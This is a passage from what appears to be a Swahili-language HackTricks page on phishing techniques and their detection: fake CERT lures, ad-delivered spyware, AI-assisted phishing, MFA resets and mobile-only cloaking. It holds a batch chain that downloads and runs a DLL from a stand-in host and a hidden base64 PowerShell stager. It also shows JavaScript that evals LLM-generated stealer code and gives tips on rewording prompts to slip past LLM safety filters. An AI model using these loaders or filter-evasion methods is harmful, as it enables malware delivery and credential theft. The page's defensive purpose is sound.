* Chambo: ushauri wa kitaifa wa CERT ulioklonishwa, wenye kitufe cha **Update** kinachoonyesha maagizo ya “fix” hatua kwa hatua. Waathiriwa wanaambiwa waendeshe batch inayopakua DLL na kuitekeleza kupitia `rundll32`.<sup>[[12]](#references)</sup>
* Msururu wa kawaida wa batch ulioonekana:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` huhifadhi payload kwenye `%TEMP%`; kusubiri kwa muda mfupi huficha network jitter, kisha `rundll32` huita exported entrypoint (`notepad`).
* DLL hutuma utambulisho wa host na hukagua C2 kila baada ya dakika chache. Maagizo ya mbali huwasili kama **PowerShell iliyosimbwa kwa base64**, ambayo hutekelezwa kwa siri na kwa bypass ya sera:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Hii huhifadhi unyumbufu wa C2 (server inaweza kubadilisha tasks bila kusasisha DLL) na kuficha madirisha ya console. Tafuta michakato ya PowerShell iliyoanzishwa na `rundll32.exe` inayotumia `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` kwa pamoja.
* Defenders wanaweza kutafuta HTTP(S) callbacks zenye muundo `...page.php?tynor=<COMPUTER>sss<USER>` na vipindi vya polling vya dakika 5 baada ya DLL kupakiwa.

---

## Malvertising inayochochewa na kuonyeshwa kwa tangazo kupitia RTB

Tofauti na matokeo ya utafutaji yaliyofadhiliwa yanayohitaji kubonyezwa, tangazo la RTB linaweza kupakia JavaScript ya wahusika wengine wakati creative yake inapoonyeshwa kwenye tovuti au app. Citizen Lab iliona ad tags zikiita decision server tofauti na vitambulishi vya matangazo. Maonyesho mengi ya matangazo yalipokea jibu tupu; baadhi ya maonyesho yaliyochaguliwa yangeweza kupokea JavaScript. Kwa hiyo, jibu lisilo na madhara wakati wa replay halithibitishi kwamba kila mtazamaji alipokea maudhui yale yale.<sup>[[14]](#references)</sup>

Huu ni **utaratibu wa uwasilishaji**, si exploit yenyewe: kutekeleza JavaScript katika mazingira ya kuonyesha tangazo hakusakinishi spyware moja kwa moja. Exploit ya msingi ya browser au OS haikufichuliwa, kwa hivyo kuonyeshwa kwa tangazo au ombi kwa decision server pekee si uthibitisho wa maambukizi. Kwa maelezo kuhusu kuhusishwa kwa vitambulishi katika ulengaji wa RTB, angalia [Threat Modeling and Identity Separation](../../privacy/threat-modeling-and-identity-separation.md).<sup>[[14]](#references)</sup>

## Operesheni za Phishing zilizoimarishwa na AI
Washambuliaji sasa huunganisha **LLM & voice-clone APIs** ili kuunda vishawishi vilivyobinafsishwa kikamilifu na kufanya mwingiliano wa wakati halisi.

| Tabaka | Matumizi ya mfano na threat actor |
|-------|-----------------------------|
|Automation|Tengeneza na utume zaidi ya barua pepe / SMS elfu 100 zenye maneno yaliyobadilishwa bila mpangilio na tracking links.|
|Generative AI|Tengeneza barua pepe za *matumizi ya mara moja* zinazorejelea M&A za hadharani, vicheshi vya ndani kutoka mitandao ya kijamii; tumia sauti bandia ya CEO kwenye ulaghai wa callback.|
|Agentic AI|Jisajili kwenye domains, kusanya intel ya vyanzo huria, na uunde barua pepe za hatua inayofuata kiotomatiki mwathiriwa anapobofya lakini asiwasilishe creds.|

**Ulinzi:**  
• Ongeza **dynamic banners** zinazoangazia ujumbe uliotumwa na automation isiyoaminika (kupitia hitilafu za ARC/DKIM).  
• Tumia **voice-biometric challenge phrases** kwa maombi ya simu yenye hatari kubwa.  
• Endelea kuiga vishawishi vinavyotengenezwa na AI katika programu za uhamasishaji – templates zisizobadilika zimepitwa na wakati.

Angalia pia – matumizi mabaya ya agentic browsing kwa credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Angalia pia – matumizi mabaya ya AI agent ya zana za CLI za ndani na MCP (kwa orodha ya siri na ugunduzi):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Uundaji wa JavaScript ya phishing wakati wa runtime kwa msaada wa LLM (uundaji wa code ndani ya browser)

Washambuliaji wanaweza kusambaza HTML inayoonekana haina madhara na **kutengeneza stealer wakati wa runtime** kwa kuomba JavaScript kutoka kwa **trusted LLM API**, kisha kuitekeleza ndani ya browser (kwa mfano, kwa `eval` au `<script>` inayoundwa dynamically).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** Ficha URLs za exfil/Base64 strings ndani ya prompt; jaribu maneno tofauti ili kukwepa safety filters na kupunguza hallucinations.
2. **Client-side API call:** wakati ukurasa unapopakiwa, JS huwasiliana na LLM ya umma (Gemini/DeepSeek/etc.) au CDN proxy; prompt/API call pekee ndiyo iliyopo kwenye HTML tuli.
3. **Assemble & exec:** Unganisha jibu na ulitekeleze (polymorphic kwa kila ziara):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** code iliyozalishwa hubinafsisha chambo (kwa mfano, uchanganuzi wa tokeni za LogoKit) na kutuma creds kwenye endpoint iliyofichwa kwenye prompt.

**Sifa za ukwepaji**
- Trafiki hupitia domains za LLM zinazojulikana sana au proxies za CDN zinazoaminika; wakati mwingine hutumia WebSockets kuelekea backend.
- Hakuna payload tuli; JS hasidi huwepo tu baada ya render.
- Uzalishaji usio wa deterministic huunda stealers **za kipekee** kwa kila session.

**Mawazo ya ugunduzi**
- Endesha sandboxes zikiwa na JS; weka alama kwa `eval` ya wakati wa runtime/uundaji wa script unaobadilika unaotokana na majibu ya LLM.
- Tafuta POSTs kutoka frontend kwenda kwenye LLM APIs zikifuatiwa mara moja na `eval`/`Function` kwenye maandishi yaliyorejeshwa.
- Toa tahadhari kuhusu domains za LLM zisizoidhinishwa kwenye trafiki ya client pamoja na POSTs za credentials zinazofuata.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Mbali na push-bombing ya kawaida, waendeshaji hulazimisha tu **usajili mpya wa MFA** wakati wa simu ya help desk, na hivyo kubatilisha tokeni iliyopo ya mtumiaji. Prompt yoyote ya login inayofuata huonekana halali kwa mwathiriwa.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Fuatilia matukio ya AzureAD/AWS/Okta ambapo **`deleteMFA` + `addMFA`** hutokea **ndani ya dakika chache kutoka IP ileile**.



## Clipboard Hijacking / Pastejacking

Washambuliaji wanaweza kunakili kimyakimya amri hasidi kwenye clipboard ya mwathiriwa kutoka kwenye ukurasa wa wavuti uliodukuliwa au wenye jina linalofanana kimakosa na halali, kisha kumdanganya mtumiaji azibandike ndani ya **Win + R**, **Win + X** au dirisha la terminal, na hivyo kutekeleza msimbo wowote bila upakuaji au kiambatisho chochote.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Usambazaji wa Programu Hasidi (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Utekaji wa kuunganisha kifaa cha WhatsApp kupitia udanganyifu wa kijamii wa QR
* Ukurasa wa chambo (kwa mfano, “channel” bandia ya wizara/CERT) huonyesha QR ya WhatsApp Web/Desktop na kumwelekeza mwathiriwa kuichanganua, na hivyo kumwongeza kimyakimya mshambuliaji kama **kifaa kilichounganishwa**.<sup>[[12]](#references)</sup>
* Mshambuliaji hupata mara moja mwonekano wa mazungumzo/mawasiliano hadi kipindi hicho kiondolewe. Waathiriwa wanaweza baadaye kuona arifa ya “kifaa kipya kimeunganishwa”; watetezi wanaweza kutafuta matukio yasiyotarajiwa ya kuunganisha kifaa muda mfupi baada ya kutembelea kurasa za QR zisizoaminika.

### Phishing inayohitaji simu ya mkononi ili kukwepa crawlers/sandboxes
Waendeshaji wanazidi kuficha mtiririko wao wa phishing nyuma ya ukaguzi rahisi wa kifaa ili crawlers za desktop zisiweze kufikia kurasa za mwisho. Muundo wa kawaida ni script ndogo inayokagua kama DOM ina uwezo wa kutumia mguso na kutuma matokeo kwenye endpoint ya server; wateja wasiotumia simu hupokea HTTP 500 (au ukurasa tupu), ilhali watumiaji wa simu huhudumiwa mtiririko kamili.<sup>[[7]](#references)</sup>

Kipande kidogo cha client (mantiki ya kawaida):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` mantiki (iliyorahisishwa):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Tabia ya seva inayozingatiwa mara nyingi:
- Huweka cookie ya session wakati wa upakiaji wa kwanza.
- Hukubali `POST /detect {"is_mobile":true|false}`.
- Hurejesha 500 (au placeholder) kwa GET zinazofuata wakati `is_mobile=false`; hutoa maudhui ya phishing ikiwa tu thamani ni `true`.

Mbinu za kutafuta na kugundua:
- Hoja ya urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetry ya wavuti: mfuatano wa `GET /static/detect_device.js` → `POST /detect` → HTTP 500 kwa vifaa visivyo vya simu; njia halali za waathiriwa wanaotumia simu hurejesha 200 pamoja na HTML/JS zinazofuata.
- Zuia au kagua kwa makini kurasa zinazoweka maudhui kutegemea pekee `ontouchstart` au ukaguzi mwingine kama huo wa kifaa.

Vidokezo vya ulinzi:
- Endesha crawlers zenye fingerprints zinazofanana na za simu na JS ikiwa imewashwa ili kufichua maudhui yaliyofichwa kwa masharti.
- Toa tahadhari kuhusu majibu ya 500 yanayotiliwa shaka yanayofuata `POST /detect` kwenye domain zilizosajiliwa hivi karibuni.

## References

- [1] [Kutengeneza Tofauti za Majina ya Domain Zinazotumiwa katika Phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Kutafuta Phishing: Zana na Mbinu (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Kuiba Credentials na Kukwepa 2FA kwa Kutumia noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Kuiba sessions na Kukwepa 2FA kwa EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Jinsi ya Kusakinisha na Kusanidi DKIM kwa Postfix kwenye Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Ripoti ya 2025 ya Unit 42 kuhusu Majibu ya Matukio ya Kimataifa – Toleo la Uhandisi wa Kijamii](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Smishing Isiyoonekana – Miundombinu ya phishing inayolenga vifaa vya simu na mbinu za utambuzi (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Mipaka Mipya ya Mashambulizi ya Runtime Assembly: Kutumia LLMs Kuzalisha JavaScript ya Phishing kwa Wakati Halisi](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Kuiga Utambulisho, Click Hijacking na TDS: Ndani ya Mfumo Ikolojia wa Usambazaji wa Malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Kutek hijack trafiki ya Microsoft windows.com kwa bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Mapenzi? Kwa Kweli: App bandia ya kuchumbiana iliyotumiwa kama chambo katika kampeni ya spyware inayolenga watu nchini Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoCs na sampuli za ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [14] [Kufichua AdFection: Jinsi Discover-Tech Ilivyogeuza Matangazo Yanayolenga Watu kuwa Njia ya Usambazaji wa Spyware ya Mercenary Isiyohitaji Bofyo](https://citizenlab.ca/research/how-discover-tech-turned-targeted-ads-into-a-pipeline-for-spyware/)
{{#include ../../banners/hacktricks-training.md}}
